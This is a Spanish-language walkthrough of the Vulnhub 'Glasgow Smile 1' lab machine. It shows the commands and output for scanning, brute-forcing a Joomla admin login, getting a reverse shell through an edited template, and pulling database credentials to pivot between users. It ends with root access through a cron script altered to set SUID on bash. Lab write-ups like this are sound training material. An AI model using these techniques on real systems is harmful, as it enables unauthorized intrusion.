---
title: GlasgowSmile1 Writeup - Vulnhub
date: 2025-03-09
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, GlasgowSmile1, OSCP Prep, Joomla, joomscan, ROT13, cewl]
image:
  path: /assets/img/commons/vulnhub/GlasgowSmile/portada.png
---

Anterior [*OSCP Lab 17*](https://lvs3c.github.io/posts/OSCP-Sar1/)

¡Saludos!

**`OSCP Lab 18`**

En este writeup, realizaremos la máquina [**Glasgow Smile 1**](https://www.vulnhub.com/entry/glasgow-smile-11,491/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- Usamos **Cewl** para generar un diccionario de palabras sobre la web.
- Explotamos panel de login sobre **CMS Joomla** mediante fuerza bruta usando BurpSuite.
- Generamos la **reverse shell** modificando un template dentro de Joomla.
- **User Pivoting** sobre tres usuarios, listando sus flags.
- Y por último, usamos **pspy** para validar **tarea Cron**, modificando el archivo ejecutado, ganando acceso como root y listando la root flag.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.50     00:0c:29:1d:88:a4       VMware, Inc.
10.11.12.200    00:50:56:e9:ee:69       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.470 seconds (103.64 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.50
PING 10.11.12.50 (10.11.12.50) 56(84) bytes of data.
64 bytes from 10.11.12.50: icmp_seq=1 ttl=64 time=0.579 ms

--- 10.11.12.50 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.579/0.579/0.579/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn 10.11.12.50 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 12:13 -03
Nmap scan report for 10.11.12.50
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:1D:88:A4 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.27 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p22,80 -sCV 10.11.12.50 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 12:14 -03
Nmap scan report for 10.11.12.50
Host is up (0.00059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:1D:88:A4 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 7.9p1`.
- Puerto `80` servidor `Apache httpd 2.4.38`.


### HTTP - 80


Validamos la web.

```bash
❯ whatweb http://10.11.12.50
http://10.11.12.50 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.11.12.50]
```

![web80](/assets/img/commons/vulnhub/GlasgowSmile/web80.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap sobre el puerto 80.

```bash
❯ sudo nmap -p80 --script http-enum 10.11.12.50 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 12:14 -03
Nmap scan report for 10.11.12.50
Host is up (0.00022s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:1D:88:A4 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 10.47 seconds
```

No nos muestra resultados. Lanzamos `gobuster` para obtener más información.

```bash
❯ gobuster dir -u http://10.11.12.50/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -o root80_go.log -b 403,404 -x txt,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.50/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.50/joomla               (Status: 301) [Size: 311] [--> http://10.11.12.50/joomla/]
http://10.11.12.50/how_to.txt           (Status: 200) [Size: 456]
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```

Validamos los resultados encontrados.

![howto](/assets/img/commons/vulnhub/GlasgowSmile/howto.png){: .center-image }

![joomla1](/assets/img/commons/vulnhub/GlasgowSmile/joomla1.png){: .center-image }

Estamos frente a `CMS Joomla`.

Vamos a utilizar la herramienta `joomscan`.

```bash
❯ joomscan -u http://10.11.12.50/joomla/ -ec

    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.11.12.50/joomla/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.3rc1

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://10.11.12.50/joomla/administrator/components
http://10.11.12.50/joomla/administrator/modules
http://10.11.12.50/joomla/administrator/templates
http://10.11.12.50/joomla/images/banners
```

`-ec` para enumerar componentes.

No nos muestra resultados importantes, validamos panel de login.

![adminpanel](/assets/img/commons/vulnhub/GlasgowSmile/adminpanel.png){: .center-image }

Intentamos loguearnos con credenciales por defecto como: `admin:admin`{: .filepath} o `joomla:joomla`{: .filepath} pero sin resultados, procedemos a realizar fuerza bruta.

Primero utilizamos la herramienta `cewl` para crear un diccionario basado en la web.

```bash
❯ cewl -m 5 http://10.11.12.50/joomla/ > creds.txt
```

Capturamos la solicitud por `Burp Suite` y usamos `intruder` tipo `sniper`{: .filepath} para fuerza bruta.

![sniper](/assets/img/commons/vulnhub/GlasgowSmile/sniper.png){: .center-image }

Probamos primero con `admin`{: .filepath} pero sin resultados, pero con `joomla`{: .filepath} sí obtenemos la clave de acceso.

Filtramos por el status code de la respuesta y una nos da `303` y nos asigna la cookie de sesión.

![sniper2](/assets/img/commons/vulnhub/GlasgowSmile/sniper2.png){: .center-image }

Ingresamos al panel.

![panelcontrol](/assets/img/commons/vulnhub/GlasgowSmile/panelcontrol.png){: .center-image }

## Explotación

---

Una vez dentro del panel, debemos verificar si podemos modificar los archivos de configuración para poder añadir código y generarnos la reverse shell.

En este caso vamos a modificar el template `Protostar`.

![template](/assets/img/commons/vulnhub/GlasgowSmile/template.png){: .center-image }

![template2](/assets/img/commons/vulnhub/GlasgowSmile/template2.png){: .center-image }

Validamos, nos ponemos en escucha y gerenamos la reverse shell.

![rs1](/assets/img/commons/vulnhub/GlasgowSmile/rs1.png){: .center-image }

![rs2](/assets/img/commons/vulnhub/GlasgowSmile/rs2.png){: .center-image }


## User Pivoting

---

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.50] 55668
bash: cannot set terminal process group (439): Inappropriate ioctl for device
bash: no job control in this shell
www-data@glasgowsmile:/var/www/html/joomla/templates/protostar$
```

En este momemto somos `www-data`{: .filepath}, listando los archivos de configuración de Joomla, encontramos `user:pass`{: .filepath} de la conexión a mysql.

```bash
www-data@glasgowsmile:/tmp$ cat /var/www/joomla2/configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Joker';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'joomla';
        public $password = 'babyjoker';
        public $db = 'joomla_db';
        public $dbprefix = 'jnqcu_';
		public $live_site = '';
        public $secret = 'fNRyp6KO51013435';
```

Ingresamos a mysql y listamos las bases de datos.

```bash
mysql -u joomla --password=babyjoker -h localhost

MariaDB [joomla_db]> show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+
5 rows in set (0.001 sec)
```

En la base de datos `batjoke`{: .filepath}, encontramos la password de `rob`.

```bash
MariaDB [joomla_db]> use batjoke;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [batjoke]> show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.000 sec)

MariaDB [batjoke]> select * from equipment;
Empty set (0.000 sec)

MariaDB [batjoke]> select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows in set (0.000 sec)

MariaDB [batjoke]>
```

Las claves están en `base64`, las desencriptamos y ya tenemos acceso al usuario `rob`.

#### User ROB

![rob](/assets/img/commons/vulnhub/GlasgowSmile/rob.png){: .center-image }

Listamos la flag y los archivos dentro del directorio.

```bash
rob@glasgowsmile:~$ ls
Abnerineedyourhelp  howtoberoot  user.txt

rob@glasgowsmile:~$ cat user.txt
JKR[f5bb11acbb957915e421d62e7253d27a]

rob@glasgowsmile:~$ cat Abnerineedyourhelp
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
rob@glasgowsmile:~$
```

El archivo `Abnerineedyourhelp`{: .filepath} está en `ROT13` con offset 1, usamos `tr` para dar vuelta la cadena.

```bash
rob@glasgowsmile:~$ echo "Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's. Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==" | tr 'A-Za-z' 'B-ZA-Ab-za-a'
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, The worst part of having a mental illness is people expect you to behave as if you don't. Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
```

También podemos usar [cyberchef](https://gchq.github.io/CyberChef/).

![base64](/assets/img/commons/vulnhub/GlasgowSmile/base64.png){: .center-image }

Desencriptamos la cadena en base64 y tenemos la pass de `abner`.

```bash
rob@glasgowsmile:~$ echo STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d; echo
I33hope99my0death000makes44more8cents00than0my0life0
```
---

#### User ABNER

Listamos la flag y los archivos dentro del directorio.

```bash
abner@glasgowsmile:~$ ls
info.txt  user2.txt

abner@glasgowsmile:~$ cat user2.txt
JKR{0286c47edc9bfdaf643f5976a8cfbd8d}

abner@glasgowsmile:~$ cat info.txt
A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
abner@glasgowsmile:~$
```

Listamos los archivos del siguiente usuario `penguin` y encontramos un archivo `.zip`{: .filepath}.

```bash
abner@glasgowsmile:~$ find / -type f -name "*penguin*" 2>/dev/null
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
```

Copiamos el archivo zip, el mismo tiene clave, usamos la pass del usuario abner, funciona y validamos el contenido.

```bash
abner@glasgowsmile:~$ cp /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip dear_penguins.zip
abner@glasgowsmile:~$ unzip dear_penguins.zip
Archive:  dear_penguins.zip
[dear_penguins.zip] dear_penguins password:
  inflating: dear_penguins
abner@glasgowsmile:~$ cat dear_penguins
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
```

---

#### User PENGUIN

Tenemos la pass del usuario `penguin`, listamos la flag.

```bash
penguin@glasgowsmile:~$ cat SomeoneWhoHidesBehindAMask/user3.txt
JKR{284a3753ec11a592ee34098b8cb43d52}
```

## Escalación de privilegios

---

Somos `penguin`, el objetivo es convertirnos en root y listar la root flag.

Ejecutamos la herramienta [*pspy*](https://github.com/DominicBreuker/pspy).

Encontramos una tarea CRON generada por root, el cual ejecuta el archivo `.trash_old`.

```bash
2025/03/11 11:38:01 CMD: UID=0     PID=16839  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
```

Procedemos a modificar dicho archivo, agregamos código para añadir el `bit SUID` a la bash.

Listamos la root flag.

```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old
#/bin/sh

#       (            (              )            (      *    (   (
# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
#

#

chmod u+s /bin/bash

exit 0

penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 17  2019 /bin/bash

penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ bash -p
bash-5.0# id
uid=1002(penguin) gid=1002(penguin) euid=0(root) groups=1002(penguin)
bash-5.0# cd /root
bash-5.0# ls
root.txt  whoami
bash-5.0# cat root.txt
  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████
 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀
▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███
░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄
░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░
      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░



Congratulations!

You've got the Glasgow Smile!

JKR{68028b11a1b7d56c521a90fc18252995}


Credits by

mindsflee
bash-5.0#
```

Hope it helps!